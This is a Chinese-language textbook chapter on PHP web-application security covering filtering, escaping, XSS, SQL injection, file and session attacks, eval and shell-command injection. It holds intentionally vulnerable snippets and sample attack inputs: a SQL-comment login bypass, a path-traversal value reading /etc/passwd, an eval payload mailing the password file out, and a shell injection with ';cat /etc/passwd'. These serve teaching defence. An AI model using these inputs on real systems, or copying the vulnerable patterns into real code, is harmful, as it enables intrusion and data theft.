# 第十四章 安全

PHP 是一种灵活的语言，可以连接到其运行机器上提供的几乎每个 API。因为它被设计为用于 HTML 页面的表单处理语言，PHP 使得使用发送到脚本的表单数据变得简单。然而，便利性是一把双刃剑。正是这些特性使得你能够快速编写 PHP 程序，但也为那些企图入侵你系统的人打开了大门。

PHP 本身既不安全也不不安全。你的 Web 应用程序的安全性完全取决于你编写的代码。例如，如果脚本打开一个文件，其文件名作为表单参数传递给脚本，那么该脚本可以被赋予一个远程 URL、绝对路径名，甚至是相对路径，从而使其能够打开站点文档根目录之外的文件。这可能会暴露你的密码文件或其他敏感信息。

Web 应用程序安全性仍然是一个相对年轻和不断发展的学科。单独一章关于安全性不足以充分为你的应用程序抵御攻击做好准备。这一章采取务实的方法，涵盖了与安全相关的一系列主题的精选，包括如何保护你的应用程序免受最常见和最危险的攻击。该章节结尾附有进一步资源的列表以及简短的总结和一些额外的建议。

# 保护措施

在开发安全站点时，你需要理解的最基本的事情之一是，所有不是应用程序自身生成的信息都可能是被污染的，或者至少是可疑的。这包括来自表单、文件和数据库的数据。应始终有相应的保护措施或防护措施。

## 过滤输入

当数据被描述为被污染时，并不一定意味着它是恶意的。这意味着它*可能是*恶意的。你不能信任源头，因此你应该检查它以确保其有效。这个检查过程称为*过滤*，你只想允许有效的数据进入你的应用程序。

在过滤过程中有一些最佳实践：

+   使用白名单方法。这意味着你在谨慎方面犯错，并假设数据是无效的，除非你能证明它是有效的。

+   永远不要更正无效数据。历史已经证明，尝试更正无效数据通常会导致由于错误而产生安全漏洞。

+   使用命名约定有助于区分经过过滤和被污染的数据。如果无法可靠地确定是否已经过滤，则过滤就毫无意义。

为了巩固这些概念，考虑一个简单的 HTML 表单，允许用户在三种颜色中选择：

```php
<form action="process.php" method="POST">
 <p>Please select a color:

 <select name="color">
 <option value="red">red</option>
 <option value="green">green</option>
 <option value="blue">blue</option>
 </select>

 <input type="submit" /></p>
</form>
```

在 *process.php* 中信任 `$_POST['color']` 是很容易的。毕竟，表单看似限制了用户可以输入的内容。然而，有经验的开发者知道 HTTP 请求对其包含的字段没有限制 —— 仅依赖客户端验证是不足够的。恶意数据可以通过多种方式发送到你的应用程序，你唯一的防御措施是什么都不信任，并过滤你的输入：

```php
$clean = array();

switch($_POST['color']) {
 case 'red':
 case 'green':
 case 'blue':
 $clean['color'] = $_POST['color'];
 break;

 default:
 /* ERROR */
 break;
}
```

这个示例展示了一个简单的命名约定。你初始化一个名为 `$clean` 的数组。对于每个输入字段，验证输入并将验证后的输入存储在数组中。这样做可以减少被污染数据误认为是过滤数据的可能性，因为你总是应该谨慎行事，考虑到未存储在这个数组中的一切都可能是污染的。

你的过滤逻辑完全取决于你正在检查的数据类型，你越严格，越好。例如，考虑一个注册表单，要求用户提供一个期望的用户名。显然，有许多可能的用户名，所以先前的例子并不适用。在这些情况下，最好的方法是基于格式进行过滤。如果你希望要求用户名是字母数字的，你的过滤逻辑可以强制执行这一点：

```php
$clean = array();

if (ctype_alnum($_POST['username'])) {
 $clean['username'] = $_POST['username'];
}
else {
 /* ERROR */
}
```

当然，这并不能确保任何特定长度。使用 `mb_strlen()` 检查字符串的长度，并强制施加最小和最大限制：

```php
$clean = array();

$length = mb_strlen($_POST['username']);

if (ctype_alnum($_POST['username']) && ($length > 0) && ($length <= 32)) {
 $clean['username'] = $_POST['username'];
}
else {
 /* ERROR */
}
```

经常情况下，你想允许的字符并不都属于单一组（比如字母数字字符），这就是正则表达式可以帮助的地方。例如，考虑以下关于姓氏的过滤逻辑：

```php
$clean = array();

if (preg_match("/[^A-Za-z \'\-]/", $_POST['last_name'])) {
 /* ERROR */
}
else {
 $clean['last_name'] = $_POST['last_name'];
}
```

此过滤器仅允许字母字符、空格、连字符和单引号（撇号），并采用前面描述的白名单方法。在这种情况下，白名单是有效字符的列表。

通常情况下，过滤是确保数据完整性的过程。但是虽然许多 Web 应用程序安全漏洞可以通过过滤来预防，但大多数是由于未对数据进行转义，而且两者都不能取代对方。

## 输出数据转义

*转义* 是一种在数据进入另一个上下文时保持其不变的技术。PHP 经常用作不同数据源之间的桥梁，在将数据发送到远程源时，你有责任适当地准备它，以避免被误解。

例如，当在 SQL 查询中用于发送到 MySQL 数据库时，`O'Reilly` 被表示为 `O\'Reilly`。反斜杠保留了单引号（撇号）在 SQL 查询语境中的含义。单引号是数据的一部分，而不是查询的一部分，转义确保了这种解释。

PHP 应用程序发送数据的两个主要远程来源是 HTTP 客户端（Web 浏览器），它们解释 HTML、JavaScript 和其他客户端技术，以及解释 SQL 的数据库。对于前者，PHP 提供了`html``entities()`：

```php
$html = array();
$html['username'] = htmlentities($clean['username'], ENT_QUOTES, 'UTF-8');

echo "<p>Welcome back, {$html['username']}.</p>";
```

本例展示了另一种命名约定的使用。`$html`数组类似于`$clean`数组，但其目的是保存在 HTML 上下文中安全使用的数据。

URL 有时嵌入到 HTML 中作为链接：

```php
<a href="http://host/script.php?var={$value}">Click Here</a>
```

在这个特定的例子中，`$value`存在于嵌套的上下文中。它位于作为 HTML 链接嵌入的 URL 的查询字符串中。由于在这种情况下是字母的，因此可以安全地在这两个上下文中使用。然而，当`$var`的值在这些上下文中不能保证安全时，必须进行两次转义：

```php
$url = array(
 'value' => urlencode($value),
);

$link = "http://host/script.php?var={$url['value']}";

$html = array(
 'link' => htmlentities($link, ENT_QUOTES, "UTF-8"),
);

echo "<a href=\"{$html['link']}\">Click Here</a>";
```

这确保链接在 HTML 上下文中安全使用，并且当作为 URL（例如用户点击链接时）使用时，URL 编码确保`$var`的值被保留。

对于大多数数据库，都有针对特定数据库的本地转义函数。例如，MySQL 扩展提供了`mysqli_real_escape_string()`：

```php
$mysql = array(
 'username' => mysqli_real_escape_string($clean['username']),
);

$sql = "SELECT * FROM profile
 WHERE username = '{$mysql['username']}'";

$result = mysql_query($sql);
```

更安全的替代方案是使用处理转义的数据库抽象库。以下示例说明了使用`PEAR::DB`来实现这一概念：

```php
$sql = "INSERT INTO users (last_name) VALUES (?)";

$db->query($sql, array($clean['last_name']));
```

尽管这不是一个完整的例子，但它突显了在 SQL 查询中使用占位符（问号）的技术。`PEAR::DB`根据数据库的要求正确引用和转义数据。查看第九章以获取有关占位符技术更详细的介绍。

一个更完整的输出转义解决方案应包括对 HTML 元素、HTML 属性、JavaScript、CSS 和 URL 内容的上下文感知转义，并且以 Unicode 安全的方式执行。示例 14-1 展示了一个根据开放式网络应用安全项目定义的[内容转义规则](https://oreil.ly/Xpu6q)，在多种情境下进行输出转义的示例类。

##### 示例 14-1\. 多种情境下的输出转义

```php
class Encoder
{
 const ENCODE_STYLE_HTML = 0;
 const ENCODE_STYLE_JAVASCRIPT = 1;
 const ENCODE_STYLE_CSS = 2;
 const ENCODE_STYLE_URL = 3;
 const ENCODE_STYLE_URL_SPECIAL = 4;

 private static $URL_UNRESERVED_CHARS =
 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz-_.~';

 public function encodeForHTML($value) {
 $value = str_replace('&', '&amp;', $value);
 $value = str_replace('<', '&lt;', $value);
 $value = str_replace('>', '&gt;', $value);
 $value = str_replace('"', '&quot;', $value);
 $value = str_replace('\'', '&#x27;', $value); // &apos; is not recommended
 $value = str_replace('/', '&#x2F;', $value); // forward slash can help end 
 HTML entity

 return $value;
 }

 public function encodeForHTMLAttribute($value) {
 return $this->_encodeString($value);
 }

 public function encodeForJavascript($value) {
 return $this->_encodeString($value, self::ENCODE_STYLE_JAVASCRIPT);
 }

 public function encodeForURL($value) {
 return $this->_encodeString($value, self::ENCODE_STYLE_URL_SPECIAL);
 }

 public function encodeForCSS($value) {
 return $this->_encodeString($value, self::ENCODE_STYLE_CSS);
 }

 /**
 * Encodes any special characters in the path portion of the URL. Does not
 * modify the forward slash used to denote directories. If your directory
 * names contain slashes (rare), use the plain urlencode on each directory
 * component and then join them together with a forward slash.
 *
 * Based on http://en.wikipedia.org/wiki/Percent-encoding and
 * http://tools.ietf.org/html/rfc3986
 */
 public function encodeURLPath($value) {
 $length = mb_strlen($value);

 if ($length == 0) {
 return $value;
 }

 $output = '';

 for ($i = 0; $i < $length; $i++) {
 $char = mb_substr($value, $i, 1);

 if ($char == '/') {
 // Slashes are allowed in paths.
 $output .= $char;
 }
 else if (mb_strpos(self::$URL_UNRESERVED_CHARS, $char) == false) {
 // It's not in the unreserved list so it needs to be encoded.
 $output .= $this->_encodeCharacter($char, self::ENCODE_STYLE_URL);
 }
 else {
 // It's in the unreserved list so let it through.
 $output .= $char;
 }
 }

 return $output;
 }

 private function _encodeString($value, $style = self::ENCODE_STYLE_HTML) {
 if (mb_strlen($value) == 0) {
 return $value;
 }

 $characters = preg_split('/(?<!^)(?!$)/u', $value);
 $output = '';

 foreach ($characters as $c) {
 $output .= $this->_encodeCharacter($c, $style);
 }

 return $output;
 }

 private function _encodeCharacter($c, $style = self::ENCODE_STYLE_HTML) {
 if (ctype_alnum($c)) {
 return $c;
 }

 if (($style === self::ENCODE_STYLE_URL_SPECIAL) && ($c == '/' || $c == ':')) {
 return $c;
 }

 $charCode = $this->_unicodeOrdinal($c);

 $prefixes = array(
 self::ENCODE_STYLE_HTML => array('&#x', '&#x'),
 self::ENCODE_STYLE_JAVASCRIPT => array('\\x', '\\u'),
 self::ENCODE_STYLE_CSS => array('\\', '\\'),
 self::ENCODE_STYLE_URL => array('%', '%'),
 self::ENCODE_STYLE_URL_SPECIAL => array('%', '%'),
 );

 $suffixes = array(
 self::ENCODE_STYLE_HTML => ';',
 self::ENCODE_STYLE_JAVASCRIPT => '',
 self::ENCODE_STYLE_CSS => '',
 self::ENCODE_STYLE_URL => '',
 self::ENCODE_STYLE_URL_SPECIAL => '',
 );

 // if ASCII, encode with \\xHH
 if ($charCode < 256) {
 $prefix = $prefixes[$style][0];
 $suffix = $suffixes[$style];

 return $prefix . str_pad(strtoupper(dechex($charCode)), 2, '0') . $suffix;
 }

 // otherwise encode with \\uHHHH
 $prefix = $prefixes[$style][1];
 $suffix = $suffixes[$style];

 return $prefix . str_pad(strtoupper(dechex($charCode)), 4, '0') . $suffix;
 }

 private function _unicodeOrdinal($u) {
 $c = mb_convert_encoding($u, 'UCS-2LE', 'UTF-8');
 $c1 = ord(substr($c, 0, 1));
 $c2 = ord(substr($c, 1, 1));

 return $c2 * 256 + $c1;
 }
}
```

# 安全漏洞

现在我们已经探讨了两种主要的保护方法，让我们转向它们试图解决的一些常见安全漏洞。

## 跨站脚本攻击

跨站脚本攻击（XSS）已成为最常见的 Web 应用程序安全漏洞，随着 Ajax 技术的日益流行，XSS 攻击可能会变得更加复杂和频繁发生。

*跨站脚本攻击*这一术语源自一个旧的漏洞利用，对于大多数现代攻击来说已经不再非常描述性或准确，这导致了一些混淆。简单来说，每当你输出未经适当转义的数据到输出的上下文中时，你的代码就容易受到漏洞攻击。例如：

```php
echo $_POST['username'];
```

这是一个极端的例子，因为`$_POST`显然既没有经过过滤也没有转义，但它展示了这种漏洞。

XSS 攻击仅限于客户端技术可以实现的范围。在历史上，XSS 已被用来通过利用`document.cookie`中包含的信息来获取受害者的 cookies。

为了防止 XSS 攻击，您只需正确转义您的输出以适应输出环境：

```php
$html = array(
 'username' => htmlentities($_POST['username'], ENT_QUOTES, "UTF-8"),
);

echo $html['username'];
```

您还应始终过滤输入，这在某些情况下可以提供冗余的保护（实施冗余的保护符合被称为*深度防御*的安全原则）。例如，如果您检查用户名以确保它是字母，并且只输出经过过滤的用户名，则不会存在 XSS 漏洞。只需确保您不依赖过滤作为防止 XSS 的主要保护措施，因为它不解决问题的根本原因。

## SQL 注入

第二常见的 Web 应用程序漏洞是 SQL 注入，这是一种与 XSS 非常相似的攻击。不同之处在于，SQL 注入漏洞存在于您在 SQL 查询中使用未转义数据的任何地方。（如果这些名称更一致，XSS 可能被称为“HTML 注入”。）

以下示例演示了 SQL 注入漏洞：

```php
$hash = hash($_POST['password']);

$sql = "SELECT count(*) FROM users
 WHERE username = '{$_POST['username']}' AND password = '{$hash}'";

$result = mysql_query($sql);
```

问题在于，如果用户名没有被转义，其值可以操纵 SQL 查询的格式。因为这种特定的漏洞非常常见，许多攻击者尝试使用以下用户名尝试登录到目标站点：

```php
chris' --
```

攻击者喜欢使用这个用户名，因为它允许访问用户名为`chris'`的账户，而无需知道该账户的密码。在插入后，SQL 查询变成：

```php
SELECT count(*)
FROM users
WHERE username = 'chris' --'
AND password = '...'";
```

因为两个连续的破折号（`--`）表示 SQL 注释的开始，所以这个查询与以下查询是相同的：

```php
SELECT count(*)
FROM users
WHERE username = 'chris'
```

如果包含此代码片段的代码假设 `$result` 非零时登录成功，则此 SQL 注入将允许攻击者登录到任何账户，而无需知道或猜测密码。

主要通过转义输出来保护您的应用程序免受 SQL 注入的攻击：

```php
$mysql = array();

$hash = hash($_POST['password']);
$mysql['username'] = mysql_real_escape_string($clean['username']);

$sql = "SELECT count(*) FROM users
 WHERE username = '{$mysql['username']}' AND password = '{$hash}'";

$result = mysql_query($sql);
```

然而，这只是确保转义的数据被解释为数据。您仍然需要过滤数据，因为像百分号（`%`）这样的字符在 SQL 中具有特殊含义，但不需要被转义。

防范 SQL 注入的最佳方法是使用*绑定参数*。以下示例演示了 PHP 的 PDO 扩展和 Oracle 数据库中绑定参数的使用：

```php
$sql = $db->prepare("SELECT count(*) FROM users
 WHERE username = :username AND password = :hash");

$sql->bindParam(":username", $clean['username'], PDO::PARAM_STRING, 32);
$sql->bindParam(":hash", hash($_POST['password']), PDO::PARAM_STRING, 32);
```

因为绑定参数确保数据永远不会进入被误解的上下文（即，它永远不会被错误解释），因此不需要对用户名和密码进行转义。

## 文件名漏洞

构造一个指向与您预期不同的内容的文件名相当容易。例如，假设您有一个`$username`变量，其中包含用户通过表单字段指定的希望称呼的名称。现在假设您希望将每个用户的欢迎消息存储在目录*/usr/local/lib/greetings*中，以便在用户登录到您的应用程序时随时输出该消息。打印当前用户欢迎词的代码如下：

```php
include("/usr/local/lib/greetings/{$username}");
```

这看起来似乎并无大碍，但如果用户选择用户名为`"../../../../etc/passwd"`，那么现在包含欢迎语的代码将包含这个相对路径：*/etc/passwd*。相对路径是黑客常用的一种针对不经意脚本的常见技巧。

另一个对不慎编程者的陷阱在于，默认情况下，PHP 可以使用与打开本地文件相同的函数来打开远程文件。`fopen()`函数及其使用的任何内容（如`include()`和`require()`）都可以将 HTTP 或 FTP URL 作为文件名传递，并且将打开 URL 标识的文档。例如：

```php
chdir("/usr/local/lib/greetings");
$fp = fopen($username, 'r');
```

如果`$username`设置为*https://www.example.com/myfile*，将打开远程文件而不是本地文件。

如果您允许用户告诉您要`include()`的文件，则情况将更糟：

```php
$file = $_REQUEST['theme'];
include($file);
```

如果用户传递了`theme`参数为*https://www.example.com/badcode.inc*，并且您的`variables_order`包含`GET`或`POST`，您的 PHP 脚本将愉快地加载并运行远程代码。永远不要像这样使用参数作为文件名。

有几种解决方案可以解决检查文件名的问题。您可以禁用远程文件访问，使用`realpath()`和`basename()`（如下所述）检查文件名，并使用`open_basedir`选项限制在站点文档根目录之外的文件系统访问。

### 检查相对路径

当您需要允许用户在应用程序中指定文件名时，您可以使用`realpath()`和`basename()`函数的组合来确保文件名应该是什么。`realpath()`函数解析特殊标记（如`.`和`..`）。调用`realpath()`后，结果路径是一个完整的路径，然后您可以使用`basename()`函数仅返回路径的文件名部分。

回到我们的欢迎消息场景，这里展示了`realpath()`和`basename()`的实际应用：

```php
$filename = $_POST['username'];
$vetted = basename(realpath($filename));

if ($filename !== $vetted) {
 die("{$filename} is not a good username");
}
```

在这种情况下，我们已经将`$filename`解析为其完整路径，然后仅提取文件名。如果此值与`$filename`的原始值不匹配，那么我们有一个不希望使用的坏文件名。

一旦您获得了完全裸露的文件名，您可以根据合法文件的存放位置重建文件路径，并根据实际文件内容添加文件扩展名：

```php
include("/usr/local/lib/greetings/{$filename}");
```

## 会话固定

针对会话的一个非常流行的攻击是会话固定。其流行的主要原因是这是攻击者获取有效会话标识符的最简单方法。因此，它被设计为会话劫持攻击的一个跳板。

会话固定是任何导致受害者使用攻击者选择的会话标识符的方法。最简单的例子是带有嵌入式会话标识符的链接：

```php
<a href="http://host/login.php?PHPSESSID=1234">Log In</a>
```

点击此链接的受害者将恢复为标识为`1234`的会话，并且如果受害者继续登录，攻击者可以劫持受害者的会话以提升权限级别。

有几种变体的这种攻击，包括一些使用 cookie 来达到同样目的的攻击。幸运的是，防护措施简单、直接且一致。每当权限级别有变化时，例如用户登录时，使用`session_regenerate_id()`重新生成会话标识符：

```php
if (check_auth($_POST['username'], $_POST['password'])) {
 $_SESSION['auth'] = TRUE;
 session_regenerate_id(TRUE);
}
```

通过确保任何登录的用户（或以任何方式提升权限级别的用户）被分配一个新的随机会话标识符，有效地防止会话固定攻击。

## 文件上传陷阱

文件上传结合了我们已经讨论过的两个危险：用户可修改的数据和文件系统。虽然 PHP 7 本身在处理上传文件时是安全的，但对于不谨慎的程序员来说，有几个潜在的陷阱。

### 不信任浏览器提供的文件名

谨慎使用浏览器发送的文件名。如果可能，不要将其用作文件系统上文件的名称。很容易让浏览器发送一个被标识为*/etc/passwd*或*/home/kevin/.forward*的文件。您可以将浏览器提供的名称用于所有用户交互，但实际调用文件时应自动生成一个唯一名称。例如：

```php
$browserName = $_FILES['image']['name'];
$tempName = $_FILES['image']['tmp_name'];

echo "Thanks for sending me {$browserName}.";

$counter++; // persistent variable
$filename = "image_{$counter}";

if (is_uploaded_file($tempName)) {
 move_uploaded_file($tempName, "/web/images/{$filename}");
}
else {
 die("There was a problem processing the file.");
}
```

### 警惕文件系统被填满

另一个陷阱是上传文件的大小。虽然您可以告诉浏览器上传文件的最大大小，但这只是建议，不能确保您的脚本不会收到更大的文件。攻击者可以通过发送足够大的文件来进行拒绝服务攻击，以填满您服务器的文件系统。

将*php.ini*中的`post_max_size`配置选项设置为您希望的最大大小（以字节为单位）：

```php
post_max_size = 1024768; // one megabyte
```

PHP 将忽略数据负载大于此大小的请求。默认的 10 MB 可能比大多数网站需要的要大。

### 考虑 EGPCS 设置

默认的`variables_order`（EGPCS：环境变量、`GET`、`POST`、cookie、服务器）在处理`GET`和`POST`参数之前处理 cookie。这使得用户有可能发送一个 cookie，覆盖您认为包含上传文件信息的全局变量。为了避免像这样被欺骗，检查给定的文件是否确实是一个上传文件，可以使用`is_uploaded_file()`函数。例如：

```php
$uploadFilepath = $_FILES['uploaded']['tmp_name'];

if (is_uploaded_file($uploadFilepath)) {
 $fp = fopen($uploadFilepath, 'r');

 if ($fp) {
 $text = fread($fp, filesize($uploadFilepath));
 fclose($fp);

 // do something with the file's contents
 }
}
```

PHP 提供了`move_uploaded_file()`函数，仅在文件是上传文件时移动文件。这比直接使用系统级函数或 PHP 的`copy()`函数移动文件更可取。例如，以下代码不能通过 Cookie 欺骗：

```php
move_uploaded_file($_REQUEST['file'], "/new/name.txt");
```

## 未经授权的文件访问

如果只有您和信任的人可以登录到您的 Web 服务器，则无需担心 PHP 程序使用或创建的文件的文件权限。然而，大多数网站托管在 ISP 的机器上，存在非信任用户可以读取您的 PHP 程序创建的文件的风险。有许多技术可用于处理文件权限问题。

### 限制文件系统访问到特定目录

您可以设置`open_basedir`选项以限制 PHP 脚本对特定目录的访问。如果在您的*php.ini*中设置了`open_basedir`，PHP 将限制文件系统和 I/O 函数，使其只能在该目录或其任何子目录中操作。例如：

```php
open_basedir = /some/path
```

有了这个配置，以下函数调用将成功：

```php
unlink("/some/path/unwanted.exe");
include("/some/path/less/travelled.inc");
```

但这些会生成运行时错误：

```php
$fp = fopen("/some/other/file.exe", 'r');
$dp = opendir("/some/path/../other/file.exe");
```

当然，一个 Web 服务器可以运行多个应用程序，每个应用程序通常将文件存储在自己的目录中。您可以像这样在*httpd.conf*文件中为每个虚拟主机基础上配置`open_basedir`：

```php
<VirtualHost 1.2.3.4>
 ServerName domainA.com
 DocumentRoot /web/sites/domainA
 php_admin_value open_basedir /web/sites/domainA
</VirtualHost>
```

类似地，您可以在*httpd.conf*中按目录或 URL 配置它：

```php
# by directory
<Directory /home/httpd/html/app1>
 php_admin_value open_basedir /home/httpd/html/app1
</Directory>

# by URL
<Location /app2>
 php_admin_value open_basedir /home/httpd/html/app2
</Location>
```

只能在*httpd.conf*文件中设置`open_basedir`目录，而不能在.*htaccess*文件中设置，必须使用`php_admin_value`来设置它。

### 第一次就正确地获取权限

不要创建文件然后更改其权限。这会产生*竞争条件*，即幸运的用户可以在创建文件后但在锁定之前打开文件。相反，请使用`umask()`函数去除不必要的权限。例如：

```php
umask(077); // disable ---rwxrwx
$fh = fopen("/tmp/myfile", 'w');
```

默认情况下，`fopen()`函数尝试以 0666（`rw-rw-rw-`）权限创建文件。首先调用`umask()`禁用组和其他位，只留下 0600（`rw-------`）。现在，当调用`fopen()`时，文件将以这些权限创建。

### 不要使用文件

因为在同一台机器上运行的所有脚本都以相同的用户身份运行，所以一个脚本创建的文件可以被另一个脚本读取，而不管哪个用户编写了该脚本。一个脚本要知道如何读取文件只需要知道该文件的名称。

没有办法改变这一点，所以最好的解决方案是不使用文件来存储应该受保护的数据；存储数据的最安全位置是在数据库中。

一个复杂的解决方法是为每个用户运行单独的 Apache 守护程序。如果您在一组 Apache 实例前面添加一个反向代理，如*haproxy*，您可能能够在单台机器上为 100 多个用户提供服务。然而，很少有网站这样做，因为复杂性和成本远远高于典型情况，其中一个 Apache 守护进程可以为数千用户提供 Web 页面。

### 保护会话文件

使用 PHP 内置的会话支持，会话信息存储在文件中。每个文件的名称是`/tmp/sess_*id*`，其中*`id`*是会话的名称，并由 Web 服务器用户 ID（通常是`nobody`）拥有。

因为所有 PHP 脚本都通过 Web 服务器以相同的用户身份运行，这意味着服务器上托管的任何 PHP 脚本都可以读取其他 PHP 站点的任何会话文件中的变量。在存储您的 PHP 代码与其他用户的 PHP 脚本共享的 ISP 服务器上的情况下，您存储在会话中的变量对其他 PHP 脚本是可见的。

更糟糕的是，服务器上的其他用户可以在会话目录*/tmp*中创建文件。没有任何阻止攻击者创建具有他们想要的任何变量和值的假会话文件。然后，他们可以让浏览器发送包含伪造会话名称的 cookie 给您的脚本，您的脚本将愉快地加载伪造会话文件中存储的变量。

一种解决方法是要求您的服务提供商配置其服务器，将会话文件放置在您自己的目录中。通常，这意味着 Apache *httpd.conf*文件中的您的`VirtualHost`块将包含：

```php
php_value session.save_path /some/path
```

如果您的服务器具有`.htaccess`的功能，并且 Apache 已配置为允许您覆盖选项，则可以自行进行更改。

### 隐藏 PHP 库

许多黑客通过下载与 HTML 和 PHP 文件一起存储在 Web 服务器文档根目录中的包含文件或数据，了解了其弱点。为了防止这种情况发生在您身上，您只需将代码库和数据存储在服务器文档根目录之外即可。

例如，如果文档根目录是*/home/httpd/html*，则该目录下方的所有内容都可以通过 URL 下载。将您的库代码、配置文件、日志文件和其他数据放在该目录之外（例如*/usr/local/lib/myapp*）是一件简单的事情。这不会阻止 Web 服务器上的其他用户访问这些文件（参见“不要使用文件”），但它确实防止了远程用户下载这些文件。

如果必须将这些辅助文件存储在文档根目录中，您应该配置 Web 服务器拒绝对这些文件的请求。例如，这会告诉 Apache 拒绝对具有常见 PHP 包含文件扩展名*.inc*的任何文件的请求：

```php
<Files ~ "\.inc$">
 Order allow,deny
 Deny from all
</Files>
```

防止下载 PHP 源文件的更好和更受欢迎的方法是始终使用*.php*扩展名。

如果您将代码库存储在与使用它们的 PHP 页面不同的目录中，您需要告诉 PHP 库的位置。要么在每个`include()`或`require()`中给出代码的路径，要么更改*php.ini*中的`include_path`：

```php
include_path = ".:/usr/local/php:/usr/local/lib/myapp";
```

## PHP 代码问题

使用`eval()`函数，PHP 允许脚本执行任意 PHP 代码。虽然在极少数情况下它可能有用，但允许任何用户提供的数据进入`eval()`调用只会引发被黑客攻击的风险。例如，以下代码是一个安全噩梦：

```php
<html>
 <head>
 <title>Here are the keys...</title>
 </head>

 <body>
 <?php if ($_REQUEST['code']) {
 echo "Executing code...";

 eval(stripslashes($_REQUEST['code'])); // BAD!
 } ?>

 <form action="<?php echo $_SERVER['PHP_SELF']; ?>">
 <input type="text" name="code" />
 <input type="submit" name="Execute Code" />
 </form>
 </body>
</html>
```

此页面从表单中获取一些任意的 PHP 代码，并将其作为脚本的一部分运行。运行的代码可以访问所有的全局变量，并以脚本相同的权限运行。不难理解为什么这是一个问题。在表单中输入以下内容：

```php
include("/etc/passwd");
```

绝不要这样做。确保这样的脚本永远不会安全是不可能的。

你可以通过在*php.ini*中的`disable_functions`配置选项中列出它们来全局禁用特定的函数调用，用逗号分隔。例如，你可能永远不需要`system()`函数，因此可以完全禁用它：

```php
disable_functions = system
```

这并不会让`eval()`更安全，因为没有办法阻止重要变量被更改，也不能防止诸如`echo()`这样的内置结构被调用。

在`include`、`require`、`include_once`和`require_once`的情况下，最好的方法是使用`allow_url_fopen`关闭远程文件访问。

在使用`preg_replace()`的`eval()`和`/e`选项时，特别是在调用中使用了任何用户输入的数据时，是很危险的。考虑以下情况：

```php
eval("2 + {$userInput}");
```

这似乎相当无害。但是，假设用户输入以下值：

```php
2; mail("l33t@somewhere.com", "Some passwords", "/bin/cat /etc/passwd");
```

在这种情况下，将同时执行预期的命令和你希望避免的命令。唯一可行的解决方案是永远不要将用户提供的数据传递给`eval()`。

## Shell 命令的弱点

在你的代码中要非常谨慎使用`exec()`、`system()`、`passthru()`和`popen()`函数以及反引号操作符（`` ` ``）。shell 是一个问题，因为它识别特殊字符（例如，分号用于分隔命令）。例如，假设你的脚本包含以下行：

```php
system("ls {$directory}");
```

如果用户将`"/tmp;cat /etc/passwd"`作为`$directory`参数传递，因为`system()`执行以下命令，你的密码文件会被显示：

```php
ls /tmp;cat /etc/passwd
```

在必须将用户提供的参数传递给 shell 命令时，使用`escapeshellarg()`来转义字符串中具有特殊含义的序列：

```php
$cleanedArg = escapeshellarg($directory);
system("ls {$cleanedArg}");
```

现在，如果用户传递`"/tmp;cat /etc/passwd"`，实际运行的命令是：

```php
ls '/tmp;cat /etc/passwd'
```

避免使用 shell 的最简单方法是在 PHP 代码中完成你想要调用的任何程序的工作，而不是调用 shell。内置函数可能比涉及 shell 的任何内容更安全。

## 数据加密问题

最后一个要讨论的主题是加密数据，你希望确保它不以原始形式可视化。这主要适用于网站密码，但也有其他示例，如社会保障号码（加拿大的社会保险号码）、信用卡号码和银行账号。

查看[PHP 网站的常见问题页面](https://oreil.ly/3wh7t)，找到适合您特定数据加密需求的最佳方法。

# 更多资源

下面的资源可以帮助您深入了解代码安全性的简要介绍：

+   [*Essential PHP Security*](https://oreil.ly/PHP_Security)（O'Reilly）由 Chris Shiflett 及其[伴随网站](http://phpsecurity.org)

+   [开放 Web 应用程序安全项目](https://www.owasp.org)

# 安全回顾

由于安全性是一个如此重要的问题，我们希望重申本章的主要要点，并提供一些额外的建议：

+   过滤输入以确保您从远程来源接收的所有数据都是您期望的数据。请记住，您的过滤逻辑越严格，应用程序越安全。

+   以上下文感知的方式转义输出，以确保您的数据不会被远程系统错误解释。

+   始终初始化您的变量。当启用`register_globals`指令时，这一点尤为重要。

+   禁用`register_globals`，`magic_quotes_gpc`和`allow_url_fopen`。有关这些指令的详细信息，请参阅[PHP 网站](http://www.php.net)。

+   每当构造文件名时，请使用`basename()`和`realpath()`检查组件。

+   将包含文件存储在文档根目录之外。最好不要使用*.inc*扩展名命名您的包含文件。使用*.php*扩展名或其他不太明显的扩展名更好。

+   每当用户的权限级别变化时，请始终调用`session_regenerate_id()`。

+   每当从用户提供的组件构造文件名时，请使用`basename()`和`realpath()`检查组件。

+   不要创建文件然后更改其权限。而是设置`umask()`以便以正确的权限创建文件。

+   不要使用用户提供的数据与`eval()`，带有`/e`选项的`preg_replace()`，或任何系统命令——`exec()`，`system()`，`popen()`，`passthru()`和反引号操作符（`` ` ``）。

# 接下来是什么

面对这样的潜在漏洞，您可能会想知道为什么您应该进行“Web 开发”工作。银行和投资公司几乎每天都有大量数据丢失和身份盗用的网络安全漏洞报告。至少，如果您要成为一名优秀的 Web 开发人员，您*必须*始终重视安全，并牢记这是一个不断变化的领域。永远不要假设您的应用程序是 100%安全的。

接下来的章节将讨论应用程序开发技术。这是另一个 Web 开发人员可以真正闪耀并减少头痛的领域。我们将涵盖代码库的使用、错误处理和性能调优等主题。
